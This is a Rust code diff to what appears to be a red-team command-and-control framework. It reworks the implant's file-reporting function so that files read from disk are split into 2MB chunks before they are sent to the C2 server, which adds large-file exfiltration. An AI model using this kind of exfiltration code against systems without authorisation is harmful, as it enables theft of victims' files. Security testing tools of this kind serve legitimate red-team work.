@@ -32,21 +32,52 @@ impl ReportLibrary for StdReportLibrary {
     fn file(&self, path: String) -> Result<(), String> {
         let content = std::fs::read(&path).map_err(|e| e.to_string())?;
 
-        let metadata = eldritch::FileMetadata {
-            path: path.clone(),
-            ..Default::default()
-        };
-        let file_msg = eldritch::File {
-            metadata: Some(metadata),
-            chunk: content,
-        };
+        // 2MB chunk size to stay safely under 4MB gRPC limit
+        let chunk_size = 2 * 1024 * 1024;
+        let chunks: Vec<Vec<u8>> = content
+            .chunks(chunk_size)
+            .map(|chunk| chunk.to_vec())
+            .collect();
 
-        let req = c2::ReportFileRequest {
-            task_id: self.task_id,
-            chunk: Some(file_msg),
-        };
+        let mut reqs = Vec::new();
+        for (i, chunk) in chunks.into_iter().enumerate() {
+            let metadata = if i == 0 {
+                Some(eldritch::FileMetadata {
+                    path: path.clone(),
+                    ..Default::default()
+                })
+            } else {
+                None
+            };
 
-        self.agent.report_file(req).map(|_| ())
+            let file_msg = eldritch::File {
+                metadata,
+                chunk,
+            };
+
+            reqs.push(c2::ReportFileRequest {
+                task_id: self.task_id,
+                chunk: Some(file_msg),
+            });
+        }
+
+        if reqs.is_empty() {
+            // Send at least one empty request with metadata for empty files
+            let metadata = eldritch::FileMetadata {
+                path: path.clone(),
+                ..Default::default()
+            };
+            let file_msg = eldritch::File {
+                metadata: Some(metadata),
+                chunk: Vec::new(),
+            };
+            reqs.push(c2::ReportFileRequest {
+                task_id: self.task_id,
+                chunk: Some(file_msg),
+            });
+        }
+
+        self.agent.report_file(reqs).map(|_| ())
     }
 
     fn process_list(&self, list: Vec<BTreeMap<String, Value>>) -> Result<(), String> {
